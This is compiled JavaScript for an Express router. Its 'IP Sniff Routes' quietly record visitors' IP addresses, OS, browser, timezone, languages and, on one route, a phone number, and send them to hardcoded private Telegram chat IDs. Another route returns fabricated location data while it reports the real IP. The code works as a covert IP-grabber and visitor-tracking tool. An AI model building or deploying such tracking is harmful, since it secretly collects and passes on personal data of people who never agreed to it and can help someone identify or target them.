"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const telegram_1 = require("../utils/telegram");
const router = express_1.default.Router();
router.get('/checkmyerror', (req, res, next) => {
    next(new Error('some error message i sent for you'));
});
router.get('/checkRoute', (req, res) => {
    res.json({
        message: 'this is a test route arash',
    });
});
router.get("/getIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const forwarded = req.headers["x-forwarded-for"];
    let ip;
    let message = "";
    if (typeof forwarded === "string") {
        ip = forwarded.split(",")[0];
    }
    else {
        ip = req.socket.remoteAddress; // fallback for localhost/dev
    }
    try {
        yield fetch(`https://api.telegram.org/bot${process.env.TELE_KEY}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: 5665639218,
                text: `A User Saw U With IP: ${ip}`,
            }),
        });
        message = "Sent was Successful Arash";
    }
    catch (error) {
        message = "Telegram request failed " + error;
    }
    res.json({
        message: message,
        latitude: 10,
        longitude: 10,
        country_name: "Nigeria",
        ip: ip,
    });
}));
router.get("/newRoute", (req, res) => {
    res.json({
        message: "this is a new route",
    });
});
// ---------------------------------------- IP Sniff Routes -------------------------------------------
function getPostClientIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
}
const TELEGRAM_CHAT_IDS = [
    process.env.TELEGRAM_CHAT_ID_1,
    process.env.TELEGRAM_CHAT_ID_2,
].filter(Boolean);
router.post("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b;
    const ip = getPostClientIp(req);
    const { timeInfo, languageInfo, os, browser } = (_a = req.body) !== null && _a !== void 0 ? _a : {};
    if (!timeInfo ||
        typeof timeInfo.visitorTimeZone !== "string" ||
        !languageInfo ||
        typeof languageInfo.language !== "string") {
        return res.status(400).json({
            error: "Invalid request body",
        });
    }
    const message = `
🎉 <b>یک بازدیدکننده‌ی خاص وارد شد</b>

🌐 <b>آی‌پی:</b> ${ip}

📱 <b>اطلاعات سیستم:</b>
سیستم عامل : ${os}
برازر : ${browser}

🕒 <b>اطلاعات زمانی</b>
منطقه‌ی زمانی بازدیدکننده: ${timeInfo.visitorTimeZone}
اختلاف زمانی با تهران (دقیقه): ${timeInfo.difference}

🗣 <b>اطلاعات زبان</b>
زبان: ${languageInfo.language}
زبان‌های تنظیم‌شده: ${Array.isArray(languageInfo.languages)
        ? languageInfo.languages.join("، ")
        : "در دسترس نیست"}
لوکال: ${(_b = languageInfo.locale) !== null && _b !== void 0 ? _b : "در دسترس نیست"}
`;
    try {
        yield (0, telegram_1.sendTelegramMessageToAll)(message, [5665639218, 192959272]);
        return res.json({
            success: true,
            message: "Sent successfully",
        });
    }
    catch (error) {
        console.error("Telegram request failed:", error);
        return res.status(500).json({
            success: false,
            message: "Telegram request failed",
        });
    }
}));
function getClientIp(req) {
    const forwarded = req.headers["x-forwarded-for"];
    return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
}
router.get("/phoneEntered", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const ip = getClientIp(req);
    const phone = typeof req.query.phone === "string" ? req.query.phone.trim() : "";
    let message;
    try {
        yield (0, telegram_1.sendTelegramMessageToAll)(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218, 192959272]);
        message = "Sent was Successful Arash";
    }
    catch (error) {
        message = "Telegram request failed " + error;
    }
    res.json({ ip, message });
}));
exports.default = router;
